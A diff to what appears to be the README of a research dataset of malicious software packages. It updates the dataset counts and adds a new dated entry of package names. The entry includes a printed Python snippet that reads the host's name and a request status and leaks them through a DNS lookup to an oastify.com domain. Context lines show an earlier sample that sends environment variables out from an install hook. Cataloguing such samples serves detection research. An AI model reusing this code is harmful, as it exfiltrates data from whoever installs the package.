@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 10,849 versions of the source code of 9,467 malicious packages.
+This data set includes about 10,857 versions of the source code of 9,473 malicious packages.
 
 ## Dataset Format
 
@@ -1266,6 +1266,26 @@ class PostDevelopCommand(develop):
         else:
             print(f"Failed to send environment variables. Status code: {response.status_code}")
 ```
+
+
+### 25 Aug. 2024
+
+artifact-lab-3-package-9fde789f [0.1.0] <br>]
+ttat-api [1.0.5] <br>
+subsys-counter [0.8.5] <br>
+kmvn-ekjvnbwkhjbewv [0.2.3, 0.2.5] <br>
+byterec-models [0.8.3, 1.5.3] <br>
+audit-themis-i18n [2.3.5] <br>
+
+```python
+su = "https://lbs-boe.bytedance.net/"
+response = requests.get(su)
+sc = response.status_code
+hostn = socket.gethostname()
+du = f"{sc}.{hostn}.w0xm0b7q0nuax7c67g51kmqwxn3mrdf2.oastify.com"
+socket.gethostbyname(du)
+```
+
 
 ## About the malicious packages detection
 
